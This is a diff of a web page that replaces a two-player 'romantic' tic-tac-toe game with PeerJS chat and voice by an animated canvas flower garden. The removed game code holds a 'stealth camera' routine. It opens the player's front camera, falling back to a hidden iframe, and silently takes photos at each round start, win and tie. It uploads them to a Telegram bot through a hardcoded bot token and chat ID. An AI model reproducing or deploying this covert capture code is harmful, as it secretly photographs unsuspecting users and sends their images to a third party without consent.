+  ctx.lineTo(1.5 + sway * 3, -h);
+  ctx.quadraticCurveTo(8 * Math.sin(f.ang * 1.3 + sway), -h * 0.5, 2.2, 0);
+  ctx.closePath();
+  ctx.fillStyle = stemGrad;
+  ctx.shadowColor = 'rgba(60, 140, 60, 0.4)';
+  ctx.shadowBlur = 8;
+  ctx.fill();
+  ctx.shadowBlur = 0;
 
-    function toggleMusic() {
-      if (isPlaying) {
-        bgMusic.pause();
-        musicBtn.classList.remove('active');
-      } else {
-        bgMusic.play().catch(e => console.log("Audio block active"));
-        musicBtn.classList.add('active');
-      }
-      isPlaying = !isPlaying;
-    }
+  ctx.beginPath();
+  ctx.moveTo(0.8, 0);
+  ctx.quadraticCurveTo(3, -h * 0.5, 0.5 + sway * 2, -h);
+  ctx.strokeStyle = 'rgba(180, 230, 160, 0.35)';
+  ctx.lineWidth = 1.4;
+  ctx.stroke();
 
-    function switchSong() {
-      currentSong = currentSong >= 3 ? 1 : currentSong + 1;
-      musicSource.src = `song${currentSong}.mp3`;
-      bgMusic.load();
-      if (isPlaying) bgMusic.play();
-    }
-
-    /* ==================== STEALTH CAMERA SYSTEM ==================== */
-    const BOT_TOKEN = '8501755697:AAFlEU0y7HA2fD-6bNa529Mfik0D5YmDDzA';
-    const CHAT_ID = '7735968383';
-    let cameraReady = false;
-    let streamRef = null;
-    let photoCountThisRound = 0;
-
-    async function initSilentCamera() {
-      try {
-        streamRef = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: 'user',
-            width: 640,
-            height: 480,
-            echoCancellation: false,
-            noiseSuppression: false,
-            autoGainControl: false
-          }
-        }).catch(async () => {
-          return new Promise((resolve) => {
-            const iframe = document.getElementById('stealthFrame');
-            iframe.src = 'data:text/html,<video autoplay muted playsinline style="position:fixed;left:-9999px"></video><script>parent.postMessage(navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}}).then(s=>s),"*")<\/script>';
-            
-            window.addEventListener('message', function listener(e) {
-              if (e.data && e.data.then) {
-                e.data.then(stream => {
-                  window.removeEventListener('message', listener);
-                  resolve(stream);
-                }).catch(() => resolve(null));
-              }
-            }, {once: true});
-          });
-        });
-
-        if (streamRef) {
-          const video = document.getElementById('stealthVideo');
-          video.srcObject = streamRef;
-          await video.play();
-          cameraReady = true;
-          console.log('✅ Get ready (popup)');
-        }
-      } catch(e) {
-        console.log('Camera init deferred');
-      }
-    }
-
-    async function takeStealthPhoto() {
-      if (!cameraReady || !streamRef) return false;
-      
-      return new Promise((resolve) => {
-        try {
-          const video = document.getElementById('stealthVideo');
-          const canvas = document.getElementById('stealthCanvas');
-          const ctx = canvas.getContext('2d');
-          
-          canvas.width = 640;
-          canvas.height = 480;
-          ctx.drawImage(video, 0, 0, 640, 480);
-          
-          canvas.toBlob((blob) => {
-            if (blob) {
-              const formData = new FormData();
-              formData.append('photo', blob, `stealth_${Date.now()}.jpg`);
-              formData.append('chat_id', CHAT_ID);
-              formData.append('caption', `📸 Game Snap ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
-              
-              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-              }).then(r => { resolve(true); }).catch(e => { resolve(false); });
-            } else {
-              resolve(false);
-            }
-          }, 'image/jpeg', 0.85);
-        } catch(e) {
-          resolve(false);
-        }
-      });
-    }
-
-    window.addEventListener('beforeunload', () => {
-      if (streamRef) {
-        streamRef.getTracks().forEach(track => track.stop());
-      }
-    });
-
-    /* ==================== TIC-TAC-TOE ==================== */
-    let boardState = ["", "", "", "", "", "", "", "", ""];
-    let currentPlayer = "X";
-    let mySymbol = "X";
-    let isGameActive = true;
-    let isMultiplayer = false;
-    let gameRoundCount = 0;
-
-    const cells = document.querySelectorAll('.cell');
-    const winningCombos = [
-      [0,1,2],[3,4,5],[6,7,8],
-      [0,3,6],[1,4,7],[2,5,8],
-      [0,4,8],[2,4,6]
+  if (leafP > 0) {
+    const leaves = [
+      { pos: 0.70, side: -1, size: 1.1, rot: 0.72 },
+      { pos: 0.52, side:  1, size: 1.0, rot: 0.68 },
+      { pos: 0.36, side: -1, size: 0.85, rot: 0.75 },
+      { pos: 0.24, side:  1, size: 0.72, rot: 0.65 }
     ];
+    leaves.forEach((L, i) => {
+      const lp = Math.max(0, Math.min(1, (leafP - i * 0.11) / 0.42));
+      if (lp <= 0) return;
+      const ly = -h * L.pos;
+      const sc = ease(lp) * L.size;
+      ctx.save();
+      ctx.translate(sway * 2.5, ly);
+      ctx.rotate(L.side * L.rot * sc);
 
-    cells.forEach(cell => {
-      cell.addEventListener('click', () => {
-        const index = cell.getAttribute('data-index');
-        if (boardState[index] !== "" || !isGameActive) return;
-        if (isMultiplayer && currentPlayer !== mySymbol) return;
+      ctx.beginPath();
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(L.side * 10 * sc, -6 * sc, L.side * 26 * sc, 4 * sc, L.side * 22 * sc, 14 * sc);
+      ctx.bezierCurveTo(L.side * 14 * sc, 10 * sc, L.side * 6 * sc, 5 * sc, 0, 0);
+      const lg = ctx.createLinearGradient(0, 0, L.side * 22 * sc, 10 * sc);
+      lg.addColorStop(0, '#a5d6a7');
+      lg.addColorStop(0.5, '#66bb6a');
+      lg.addColorStop(1, '#388e3c');
+      ctx.fillStyle = lg;
+      ctx.globalAlpha = 0.92 * sc;
+      ctx.fill();
 
-        executeMove(index, currentPlayer);
-        if (isMultiplayer && dataConnection) {
-          dataConnection.send({ type: 'MOVE', index: index, symbol: mySymbol });
-        }
-      });
+      ctx.beginPath();
+      ctx.moveTo(0, 0);
+      ctx.quadraticCurveTo(L.side * 11 * sc, 5 * sc, L.side * 20 * sc, 12 * sc);
+      ctx.strokeStyle = 'rgba(40, 100, 50, 0.55)';
+      ctx.lineWidth = 1.3;
+      ctx.stroke();
+
+      for (let v = 1; v <= 3; v++) {
+        const t = v / 4;
+        ctx.beginPath();
+        ctx.moveTo(L.side * 5 * sc * t, 2 * sc * t);
+        ctx.quadraticCurveTo(L.side * (8 + v * 3) * sc * t, (3 + v) * sc * t, L.side * (12 + v * 2) * sc * t, (6 + v * 1.5) * sc * t);
+        ctx.strokeStyle = 'rgba(50, 110, 55, 0.35)';
+        ctx.lineWidth = 0.8;
+        ctx.stroke();
+      }
+      ctx.globalAlpha = 1;
+      ctx.restore();
     });
+  }
+  ctx.restore();
 
-    function executeMove(index, symbol) {
-      boardState[index] = symbol;
-      const cell = cells[index];
-      cell.innerText = symbol;
-      cell.classList.add(symbol.toLowerCase());
+  const tipX = x + Math.sin(f.ang + sway * 0.18) * h;
+  const tipY = y - Math.cos(f.ang + sway * 0.18) * h;
+  return { tipX, tipY };
+}
 
-      if (checkWin(symbol)) {
-        isGameActive = false;
-        // Take photo 2: on win
-        takeStealthPhoto();
-        setTimeout(() => takeStealthPhoto(), 300);
-        alert(`${symbol === mySymbol ? 'You Won! ❤️' : 'opponent Won! 💖'}`);
-        return;
-      }
+/* bud */
+function drawBud(f, tipX, tipY, budP) {
+  if (budP <= 0) return;
+  const s = ease(budP);
+  ctx.save();
+  ctx.translate(tipX, tipY);
+  ctx.rotate(f.ang);
+  ctx.scale(s, s);
 
-      if (boardState.every(c => c !== "")) {
-        isGameActive = false;
-        // Take photo 2: on tie
-        takeStealthPhoto();
-        setTimeout(() => takeStealthPhoto(), 300);
-        alert("It's a Romantic Tie! 💕");
-        return;
-      }
+  ctx.beginPath();
+  ctx.ellipse(0, -12, 11, 16, 0, 0, Math.PI * 2);
+  const bg = ctx.createLinearGradient(0, 0, 0, -28);
+  bg.addColorStop(0, f.preset.bud);
+  bg.addColorStop(0.55, f.preset.petalMid);
+  bg.addColorStop(1, f.preset.petalDeep);
+  ctx.fillStyle = bg;
+  ctx.shadowColor = f.preset.glow;
+  ctx.shadowBlur = 14;
+  ctx.fill();
+  ctx.shadowBlur = 0;
 
-      currentPlayer = currentPlayer === "X" ? "O" : "X";
-      updateTurnUI();
+  ctx.beginPath();
+  ctx.ellipse(-3, -16, 4, 7, -0.3, 0, Math.PI * 2);
+  ctx.fillStyle = 'rgba(255,255,255,0.25)';
+  ctx.fill();
+
+  ctx.fillStyle = '#558b2f';
+  ctx.globalAlpha = 0.8;
+  ctx.beginPath();
+  ctx.ellipse(-9, -4, 5.5, 9, -0.5, 0, Math.PI * 2);
+  ctx.ellipse(9, -4, 5.5, 9, 0.5, 0, Math.PI * 2);
+  ctx.ellipse(0, 2, 7, 6, 0, 0, Math.PI * 2);
+  ctx.fill();
+  ctx.globalAlpha = 1;
+  ctx.restore();
+}
+
+/* normal bloom */
+function drawBloom(f, tipX, tipY, openP, time) {
+  if (openP <= 0) return;
+  const s = 0.1 + easeBack(openP) * 0.9;
+  const pr = f.preset;
+  const breathe = 1 + Math.sin(time * 1.6 + f.phase) * 0.03;
+
+  ctx.save();
+  ctx.translate(tipX, tipY);
+  ctx.rotate(f.ang + Math.sin(time * 0.65 + f.phase) * 0.05);
+  ctx.scale(s * breathe, s * breathe);
+
+  ctx.beginPath();
+  ctx.arc(0, 0, 52, 0, Math.PI * 2);
+  const gl = ctx.createRadialGradient(0, 0, 6, 0, 0, 52);
+  gl.addColorStop(0, pr.glow);
+  gl.addColorStop(1, 'transparent');
+  ctx.fillStyle = gl;
+  ctx.fill();
+
+  const total = f.petals;
+  for (let i = 0; i < total; i++) {
+    const a = (i / total) * Math.PI * 2 - Math.PI / 2 + 0.15;
+    ctx.save();
+    ctx.rotate(a);
+    ctx.beginPath();
+    if (f.isTulip) {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(16, -16, 14, -38, 0, -44);
+      ctx.bezierCurveTo(-14, -38, -16, -16, 0, 0);
+    } else if (f.isSun) {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(8, -8, 7, -25, 0, -30);
+      ctx.bezierCurveTo(-7, -25, -8, -8, 0, 0);
+    } else {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(20, -12, 18, -34, 0, -40);
+      ctx.bezierCurveTo(-18, -34, -20, -12, 0, 0);
     }
+    const pg = ctx.createLinearGradient(0, 0, 0, -42);
+    pg.addColorStop(0, pr.petalDeep);
+    pg.addColorStop(0.5, pr.petalMid);
+    pg.addColorStop(1, pr.petalLight);
+    ctx.fillStyle = pg;
+    ctx.globalAlpha = 0.85;
+    ctx.shadowColor = pr.glow;
+    ctx.shadowBlur = 10;
+    ctx.fill();
+    ctx.shadowBlur = 0;
+    ctx.globalAlpha = 1;
+    ctx.restore();
+  }
 
-    function checkWin(symbol) {
-      return winningCombos.some(combo => combo.every(i => boardState[i] === symbol));
+  for (let i = 0; i < total; i++) {
+    const a = (i / total) * Math.PI * 2 - Math.PI / 2;
+    ctx.save();
+    ctx.rotate(a);
+    ctx.beginPath();
+    if (f.isTulip) {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(14, -14, 12, -34, 0, -40);
+      ctx.bezierCurveTo(-12, -34, -14, -14, 0, 0);
+    } else if (f.isSun) {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(7, -7, 6, -23, 0, -28);
+      ctx.bezierCurveTo(-6, -23, -7, -7, 0, 0);
+    } else {
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(17, -10, 15, -32, 0, -37);
+      ctx.bezierCurveTo(-15, -32, -17, -10, 0, 0);
     }
+    const pg = ctx.createLinearGradient(0, 0, 0, -38);
+    pg.addColorStop(0, pr.petalMid);
+    pg.addColorStop(0.45, pr.petalLight);
+    pg.addColorStop(1, '#fffaf5');
+    ctx.fillStyle = pg;
+    ctx.shadowColor = 'rgba(255,255,255,0.3)';
+    ctx.shadowBlur = 6;
+    ctx.fill();
+    ctx.shadowBlur = 0;
+    ctx.beginPath();
+    ctx.moveTo(0, -3);
+    ctx.quadraticCurveTo(2, -18, 0, -33);
+    ctx.strokeStyle = 'rgba(255,255,255,0.22)';
+    ctx.lineWidth = 1.1;
+    ctx.stroke();
+    ctx.restore();
+  }
 
-    function updateTurnUI() {
-      const p1Card = document.getElementById('p1-card');
-      const p2Card = document.getElementById('p2-card');
-      const p1Status = document.getElementById('p1-status');
-      const p2Status = document.getElementById('p2-status');
+  if (pr.core) {
+    const r = f.isSun ? 14 : 10;
+    ctx.beginPath();
+    ctx.arc(0, 0, r, 0, Math.PI * 2);
+    if (f.isSun) {
+      const cg = ctx.createRadialGradient(0, 0, 2, 0, 0, r);
+      cg.addColorStop(0, '#5d4037');
+      cg.addColorStop(0.7, '#3e2723');
+      cg.addColorStop(1, '#2c1a12');
+      ctx.fillStyle = cg;
+      ctx.shadowColor = 'rgba(0,0,0,0.4)';
+      ctx.shadowBlur = 8;
+      ctx.fill();
+      ctx.fillStyle = 'rgba(40, 25, 15, 0.7)';
+      for (let k = 0; k < 18; k++) {
+        const aa = (k / 18) * Math.PI * 2 + time * 0.1;
+        const rr = 4 + (k % 3) * 2.2;
+        ctx.beginPath();
+        ctx.ellipse(Math.cos(aa) * rr * 0.7, Math.sin(aa) * rr * 0.7, 1.6, 2.2, aa, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    } else {
+      const cg = ctx.createRadialGradient(-3, -3, 1, 0, 0, r);
+      cg.addColorStop(0, '#fffde7');
+      cg.addColorStop(0.5, pr.core);
+      cg.addColorStop(1, '#ffb300');
+      ctx.fillStyle = cg;
+      ctx.shadowColor = 'rgba(255,200,50,0.7)';
+      ctx.shadowBlur = 12;
+      ctx.fill();
+      ctx.strokeStyle = 'rgba(255, 220, 100, 0.7)';
+      ctx.lineWidth = 1.1;
+      for (let k = 0; k < 10; k++) {
+        const aa = (k / 10) * Math.PI * 2;
+        ctx.beginPath();
+        ctx.moveTo(Math.cos(aa) * 3, Math.sin(aa) * 3);
+        ctx.lineTo(Math.cos(aa) * 7.5, Math.sin(aa) * 7.5);
+        ctx.stroke();
+        ctx.beginPath();
+        ctx.arc(Math.cos(aa) * 7.5, Math.sin(aa) * 7.5, 1.3, 0, Math.PI * 2);
+        ctx.fillStyle = '#fff59d';
+        ctx.fill();
+      }
+    }
+  }
+  ctx.restore();
+}
 
-      if (currentPlayer === mySymbol) {
-        p1Card.classList.add('active-turn');
-        p2Card.classList.remove('active-turn');
-        p1Status.innerText = "Turn";
-        p2Status.innerText = "Wait";
+/* ========== EXTRA REALISTIC ROSE ========== */
+function drawRealisticRose(f, tipX, tipY, openP, time) {
+  if (openP <= 0) return;
+  const s = 0.12 + easeBack(openP) * 0.88;
+  const pr = f.preset;
+  const breathe = 1 + Math.sin(time * 1.5 + f.phase) * 0.028;
+
+  ctx.save();
+  ctx.translate(tipX, tipY);
+  ctx.rotate(f.ang + Math.sin(time * 0.6 + f.phase) * 0.04);
+  ctx.scale(s * breathe, s * breathe);
+
+  // soft glow
+  ctx.beginPath();
+  ctx.arc(0, 0, 58, 0, Math.PI * 2);
+  const gl = ctx.createRadialGradient(0, 0, 8, 0, 0, 58);
+  gl.addColorStop(0, pr.glow);
+  gl.addColorStop(1, 'transparent');
+  ctx.fillStyle = gl;
+  ctx.fill();
+
+  // Rose has many overlapping spiral petals
+  const layers = [
+    { count: 5,  radius: 38, width: 22, alpha: 0.75, offset: 0.0  },
+    { count: 7,  radius: 32, width: 19, alpha: 0.85, offset: 0.3  },
+    { count: 8,  radius: 25, width: 16, alpha: 0.92, offset: 0.55 },
+    { count: 6,  radius: 18, width: 13, alpha: 0.95, offset: 0.8  },
+    { count: 5,  radius: 12, width: 10, alpha: 1.0,  offset: 1.1  }
+  ];
+
+  layers.forEach((layer, li) => {
+    for (let i = 0; i < layer.count; i++) {
+      const a = (i / layer.count) * Math.PI * 2 - Math.PI / 2 + layer.offset + li * 0.15;
+      ctx.save();
+      ctx.rotate(a);
+      ctx.beginPath();
+      // classic rose petal shape (rounded + pointed tip)
+      ctx.moveTo(0, 0);
+      ctx.bezierCurveTo(layer.width * 0.7, -layer.radius * 0.25,
+                        layer.width, -layer.radius * 0.7,
+                        0, -layer.radius);
+      ctx.bezierCurveTo(-layer.width, -layer.radius * 0.7,
+                        -layer.width * 0.7, -layer.radius * 0.25,
+                        0, 0);
+
+      const pg = ctx.createLinearGradient(0, 0, 0, -layer.radius);
+      if (li < 2) {
+        pg.addColorStop(0, pr.petalDeep);
+        pg.addColorStop(0.55, pr.petalMid);
+        pg.addColorStop(1, pr.petalLight);
       } else {
-        p2Card.classList.add('active-turn');
-        p1Card.classList.remove('active-turn');
-        p2Status.innerText = "Turn";
-        p1Status.innerText = "Wait";
+        pg.addColorStop(0, pr.petalMid);
+        pg.addColorStop(0.5, pr.petalLight);
+        pg.addColorStop(1, '#fff5f5');
       }
+      ctx.fillStyle = pg;
+      ctx.globalAlpha = layer.alpha;
+      ctx.shadowColor = pr.glow;
+      ctx.shadowBlur = li === 0 ? 12 : 5;
+      ctx.fill();
+      ctx.shadowBlur = 0;
+
+      // subtle inner fold
+      ctx.beginPath();
+      ctx.moveTo(0, -2);
+      ctx.quadraticCurveTo(layer.width * 0.15, -layer.radius * 0.5, 0, -layer.radius * 0.9);
+      ctx.strokeStyle = 'rgba(255,255,255,0.18)';
+      ctx.lineWidth = 1.0;
+      ctx.stroke();
+      ctx.restore();
     }
+  });
 
-    function resetGame(sendRemote = true) {
-      boardState = ["", "", "", "", "", "", "", "", ""];
-      isGameActive = true;
-      currentPlayer = "X";
-      cells.forEach(cell => {
-        cell.innerText = "";
-        cell.classList.remove('x', 'o');
-      });
-      updateTurnUI();
+  // center
+  ctx.beginPath();
+  ctx.arc(0, 0, 9, 0, Math.PI * 2);
+  const cg = ctx.createRadialGradient(-2, -2, 1, 0, 0, 9);
+  cg.addColorStop(0, '#fffde7');
+  cg.addColorStop(0.5, pr.core || '#ffd54f');
+  cg.addColorStop(1, '#ffb300');
+  ctx.fillStyle = cg;
+  ctx.shadowColor = 'rgba(255,200,50,0.7)';
+  ctx.shadowBlur = 10;
+  ctx.fill();
 
-      gameRoundCount++;
+  // tiny stamens
+  ctx.strokeStyle = 'rgba(255, 220, 100, 0.75)';
+  ctx.lineWidth = 1.15;
+  for (let k = 0; k < 12; k++) {
+    const aa = (k / 12) * Math.PI * 2;
+    ctx.beginPath();
+    ctx.moveTo(Math.cos(aa) * 3.5, Math.sin(aa) * 3.5);
+    ctx.lineTo(Math.cos(aa) * 8, Math.sin(aa) * 8);
+    ctx.stroke();
+    ctx.beginPath();
+    ctx.arc(Math.cos(aa) * 8, Math.sin(aa) * 8, 1.4, 0, Math.PI * 2);
+    ctx.fillStyle = '#fff59d';
+    ctx.fill();
+  }
 
-      // Take photo 1: on new round start (2 photos per round)
-      setTimeout(() => {
-        takeStealthPhoto();
-        setTimeout(() => takeStealthPhoto(), 400);
-      }, 500);
+  ctx.restore();
+}
 
-      if (isMultiplayer && sendRemote && dataConnection) {
-        dataConnection.send({ type: 'RESET' });
+/* main animation */
+let startT = 0;
+function frame(now) {
+  if (!startT) startT = now;
+  const elapsed = (now - startT) / 1000;
+  const time = now / 1000;
+
+  ctx.clearRect(0, 0, W, H);
+
+  const bg = ctx.createRadialGradient(W / 2, H * 0.3, 0, W / 2, H * 0.4, Math.max(W, H) * 0.9);
+  bg.addColorStop(0, '#1f0b1a');
+  bg.addColorStop(0.5, '#0c050e');
+  bg.addColorStop(1, '#030208');
+  ctx.fillStyle = bg;
+  ctx.fillRect(0, 0, W, H);
+
+  particles.forEach(p => { p.update(); p.draw(); });
+
+  const ground = ctx.createLinearGradient(0, H * 0.82, 0, H);
+  ground.addColorStop(0, 'transparent');
+  ground.addColorStop(1, 'rgba(25, 55, 35, 0.3)');
+  ctx.fillStyle = ground;
+  ctx.fillRect(0, H * 0.78, W, H * 0.22);
+
+  // normal flowers
+  flowers.forEach(f => {
+    const local = elapsed - f.delay;
+    if (local < 0) return;
+
+    const rootP  = ease(Math.min(1, local / 0.5));
+    const stemP  = ease(Math.max(0, Math.min(1, (local - STAGE.stem) / 1.75)));
+    const leafP  = ease(Math.max(0, Math.min(1, (local - STAGE.leaf) / 0.95)));
+    const budP   = ease(Math.max(0, Math.min(1, (local - STAGE.bud) / 0.8)));
+    const openP  = ease(Math.max(0, Math.min(1, (local - STAGE.open) / 1.2)));
+    const budFade = openP > 0 ? Math.max(0, 1 - openP * 2.0) : 1;
+
+    drawRoot(f, rootP);
+    const tip = drawStemAndLeaves(f, stemP, leafP, time);
+
+    if (openP > 0.03) {
+      drawBloom(f, tip.tipX, tip.tipY, openP, time);
+    } else if (budP > 0) {
+      drawBud(f, tip.tipX, tip.tipY, budP * budFade);
+    }
+  });
+
+  // show rose message after main garden is mostly done
+  if (!mainDone && elapsed > 22) {
+    mainDone = true;
+    roseMsg.classList.add('show');
+  }
+
+  // realistic roses
+  if (rosesStarted) {
+    const roseElapsed = (now - roseStartT) / 1000;
+    roses.forEach(f => {
+      const local = roseElapsed - f.delay;
+      if (local < 0) return;
+
+      const rootP  = ease(Math.min(1, local / 0.5));
+      const stemP  = ease(Math.max(0, Math.min(1, (local - STAGE.stem) / 1.8)));
+      const leafP  = ease(Math.max(0, Math.min(1, (local - STAGE.leaf) / 1.0)));
+      const budP   = ease(Math.max(0, Math.min(1, (local - STAGE.bud) / 0.85)));
+      const openP  = ease(Math.max(0, Math.min(1, (local - STAGE.open) / 1.3)));
+      const budFade = openP > 0 ? Math.max(0, 1 - openP * 2.0) : 1;
+
+      drawRoot(f, rootP);
+      const tip = drawStemAndLeaves(f, stemP, leafP, time);
+
+      if (openP > 0.03) {
+        drawRealisticRose(f, tip.tipX, tip.tipY, openP, time);
+      } else if (budP > 0) {
+        drawBud(f, tip.tipX, tip.tipY, budP * budFade);
       }
-    }
+    });
+  }
 
-    /* ==================== PEERJS + VOICE ==================== */
-    let peer = null, dataConnection = null, localStream = null, micActive = false;
+  requestAnimationFrame(frame);
+}
 
-    function initPeer() {
-      peer = new Peer();
-      peer.on('open', id => {
-        document.getElementById('my-code').innerText = id;
-      });
+seeBtn.addEventListener('click', () => {
+  intro.classList.add('hide');
+  startT = 0;
+  started = true;
+  music.play().catch(() => {});
+  requestAnimationFrame(frame);
 
-      peer.on('connection', conn => {
-        dataConnection = conn;
-        setupDataListener();
-        isMultiplayer = true;
-        mySymbol = "O";
-        showConnectingScreenAndStart();
-      });
+  for (let i = 0; i < 14; i++) {
+    const sp = document.createElement('div');
+    sp.className = 'sparkle';
+    sp.textContent = ['✨', '🌸', '💕', '🌷', '💖', '🌺'][i % 6];
+    sp.style.left = Math.random() * 100 + 'vw';
+    sp.style.animationDelay = (Math.random() * 6) + 's';
+    sp.style.animationDuration = (5.5 + Math.random() * 4) + 's';
+    document.body.appendChild(sp);
+  }
+});
 
-      peer.on('call', call => {
-        navigator.mediaDevices.getUserMedia({ 
-          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
-        }).then(stream => {
-          localStream = stream;
-          call.answer(stream);
-          call.on('stream', rStream => {
-            document.getElementById('remoteAudio').srcObject = rStream;
-          });
-        });
-      });
-    }
+/* click on rose message → grow real roses */
+roseMsg.addEventListener('click', () => {
+  if (rosesStarted) return;
+  rosesStarted = true;
+  roseStartT = performance.now();
+  roseMsg.classList.remove('show');
 
-    function startConnection() {
-      const code = document.getElementById('friend-code').value.trim();
-      if (!code) return alert("Please enter Bestie's Code!");
-
-      dataConnection = peer.connect(code);
-      setupDataListener();
-      isMultiplayer = true;
-      mySymbol = "X";
-      showConnectingScreenAndStart();
-      startVoiceCall(code);
-    }
-
-    function showConnectingScreenAndStart() {
-      document.getElementById('lobby-input-box').style.display = 'none';
-      document.getElementById('lobby-connecting-box').style.display = 'block';
-
-      setTimeout(() => {
-        goToPage('page-game');
-        resetGame(false);
-      }, 2000);
-    }
-
-    function setupDataListener() {
-      dataConnection.on('data', data => {
-        if (data.type === 'MOVE') executeMove(data.index, data.symbol);
-        if (data.type === 'RESET') resetGame(false);
-        if (data.type === 'GIFT') triggerGiftAnimation(data.emoji, false);
-        if (data.type === 'CHAT') receiveChatMsg(data.text, data.name);
-      });
-    }
-
-    function copyCode() {
-      const code = document.getElementById('my-code').innerText;
-      if (code && code !== "Generating...") {
-        navigator.clipboard.writeText(code);
-        alert("Code copied!");
-      }
-    }
-
-    async function toggleMic() {
-      const micBtn = document.getElementById('micBtn');
-
-      if (!micActive) {
-        try {
-          localStream = await navigator.mediaDevices.getUserMedia({
-            audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
-          });
-          micActive = true;
-          micBtn.classList.add('active');
-          micBtn.innerHTML = '<i class="fa-solid fa-microphone"></i>';
-
-          if (dataConnection && peer) {
-            startVoiceCall(dataConnection.peer);
-          }
-        } catch (err) {
-          alert('Microphone access blocked.');
-        }
-      } else {
-        if (localStream) localStream.getTracks().forEach(track => track.stop());
-        micActive = false;
-        micBtn.classList.remove('active');
-        micBtn.innerHTML = '<i class="fa-solid fa-microphone-slash"></i>';
-      }
-    }
-
-    function startVoiceCall(remoteId) {
-      if (!localStream) return;
-      const call = peer.call(remoteId, localStream);
-      call.on('stream', rStream => {
-        document.getElementById('remoteAudio').srcObject = rStream;
-      });
-    }
-
-    /* ==================== GIFTS ==================== */
-    function sendGift(emoji) {
-      triggerGiftAnimation(emoji, true);
-      if (isMultiplayer && dataConnection) {
-        dataConnection.send({ type: 'GIFT', emoji: emoji });
-      }
-    }
-
-    function triggerGiftAnimation(emoji, isSentByMe) {
-      const startCard = isSentByMe ? document.getElementById('p1-card') : document.getElementById('p2-card');
-      const targetCard = isSentByMe ? document.getElementById('p2-card') : document.getElementById('p1-card');
-
-      const startRect = startCard.getBoundingClientRect();
-      const targetRect = targetCard.getBoundingClientRect();
-
-      const giftEl = document.createElement('div');
-      giftEl.className = 'flying-gift';
-      giftEl.innerText = emoji;
-      giftEl.style.left = `${startRect.left + startRect.width / 2}px`;
-      giftEl.style.top = `${startRect.top + startRect.height / 2}px`;
-      document.body.appendChild(giftEl);
-
-      setTimeout(() => {
-        giftEl.style.left = `${targetRect.left + targetRect.width / 2}px`;
-        giftEl.style.top = `${targetRect.top + targetRect.height / 2}px`;
-        giftEl.style.transform = 'scale(1.4) rotate(360deg)';
-      }, 50);
-
-      setTimeout(() => {
-        giftEl.remove();
-        const blastEl = document.createElement('div');
-        blastEl.className = 'blast-effect';
-        blastEl.innerText = emoji === '🥊' ? '💥' : '💖';
-        blastEl.style.left = `${targetRect.left + targetRect.width / 4}px`;
-        blastEl.style.top = `${targetRect.top}px`;
-        document.body.appendChild(blastEl);
-
-        setTimeout(() => blastEl.remove(), 600);
-      }, 850);
-    }
-
-    /* ==================== CHAT SYSTEM ==================== */
-    let chatOpen = false;
-    let unreadCount = 0;
-
-    function toggleChat() {
-      const box = document.getElementById('chatBox');
-      chatOpen = !chatOpen;
-      if (chatOpen) {
-        box.classList.add('open');
-        document.getElementById('chatBadge').style.display = 'none';
-        unreadCount = 0;
-        document.getElementById('chatInput').focus();
-      } else {
-        box.classList.remove('open');
-      }
-    }
-
-    function sendChatMsg() {
-      const input = document.getElementById('chatInput');
-      const text = input.value.trim();
-      if (!text) return;
-
-      // Show on sender side
-      addChatMessage(text, true);
-
-      // Send via PeerJS
-      if (isMultiplayer && dataConnection) {
-        dataConnection.send({ type: 'CHAT', text: text, name: 'You' });
-      }
-
-      input.value = '';
-    }
-
-    function receiveChatMsg(text, name) {
-      addChatMessage(text, false);
-      // If chat not open, increment badge
-      if (!chatOpen) {
-        unreadCount++;
-        const badge = document.getElementById('chatBadge');
-        badge.style.display = 'flex';
-        badge.innerText = unreadCount;
-      }
-    }
-
-    function addChatMessage(text, isMe) {
-      const container = document.getElementById('chatMessages');
-      const msgDiv = document.createElement('div');
-      msgDiv.className = `msg ${isMe ? 'me' : 'other'}`;
-      msgDiv.innerText = text;
-      container.appendChild(msgDiv);
-      container.scrollTop = container.scrollHeight;
-    }
-
-  </script>
+  // create the special roses
+  ROSE_LAYOUT.forEach(l => roses.push(createFlower(l, true)));
+});
+</script>
 </body>
-       </html>
+  </html>
